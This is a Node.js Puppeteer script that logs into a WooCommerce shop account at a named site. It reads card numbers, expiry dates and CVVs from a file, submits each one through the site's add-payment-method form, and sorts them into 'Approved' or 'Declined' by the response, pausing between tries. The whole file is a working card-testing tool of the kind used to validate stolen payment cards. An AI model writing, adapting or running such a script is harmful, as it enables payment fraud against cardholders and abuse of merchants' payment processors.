const puppeteer = require('puppeteer');
const fs = require('fs');
const readline = require('readline');

const colors = {
    green: '\x1b[32m',
    red: '\x1b[31m',
    reset: '\x1b[0m'
};

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const askCredentials = () => {
    return new Promise((resolve, reject) => {
        rl.question('username: ', (username) => {
            rl.question('password: ', (password) => {
                resolve({ username, password });
                rl.close();
            });
        });
    });
};

(async () => {
    const { username, password } = await askCredentials(); 

    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    try {
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
        await page.setDefaultNavigationTimeout(120000);


        await page.goto('https://gypsybi.com/my-account/add-payment-method/', { 
            waitUntil: 'networkidle2', 
            timeout: 90000 
        });
        
        await page.type('#username', username);
        await page.type('#password', password);

        await Promise.all([
            page.waitForNavigation(),
            page.click('button.woocommerce-form-login__submit')
        ]);


        const tarjetas = fs.readFileSync('cards.txt', 'utf-8').split('\n');

        for (const linea of tarjetas) {
            if (!linea.trim()) continue;
            const [numero, mes, año, cvv] = linea.trim().split('|');

            await page.goto('https://gypsybi.com/my-account/add-payment-method/', {
                waitUntil: 'networkidle2',
                timeout: 60000 
            });

            const numeroFrame = await page.waitForSelector('iframe[title*="Credit Card Number"]');
            const frameNumero = await numeroFrame.contentFrame();
            await new Promise(resolve => setTimeout(resolve, 1000));
            await frameNumero.type('#credit-card-number', numero, { delay: 100 });

            const fechaFrame = await page.waitForSelector('iframe[title*="Expiration"]');
            const frameFecha = await fechaFrame.contentFrame();
            await frameFecha.type('#expiration', `${mes}/${año}`);

            const cvvFrame = await page.waitForSelector('iframe[title*="CVV"]');
            const frameCVV = await cvvFrame.contentFrame();
            await frameCVV.type('#cvv', cvv);

            await page.click('#place_order');
            await new Promise(resolve => setTimeout(resolve, 5000));

            const errorElement = await page.$('.woocommerce-error');
            const successElement = await page.$('.woocommerce-message');

            let errorMessage = '';
            let successMessage = '';

            if (errorElement) {
                errorMessage = await page.evaluate(el => el.textContent.trim(), errorElement);
            }
            if (successElement) {
                successMessage = await page.evaluate(el => el.textContent.trim(), successElement);
            }

            if (successMessage.includes('Nice! New payment method added:') || 
                errorMessage.includes('Card Issuer Declined CVV')) {
                console.log(`${colors.green}Approved ✅ - ${numero}|${mes}|${año}|${cvv} | ${errorMessage}${colors.reset}`);
            } else if (errorMessage) {
                console.log(`${colors.red}Declined ❌ - ${errorMessage}${colors.reset}`);
            } else {
                console.log(`${colors.red}Error desconocido${colors.reset}`);
            }

            await new Promise(resolve => setTimeout(resolve, 20000));
        }

    } catch (error) {
        console.error('Error crítico:', error);
    } finally {
        await browser.close();
    }
})();
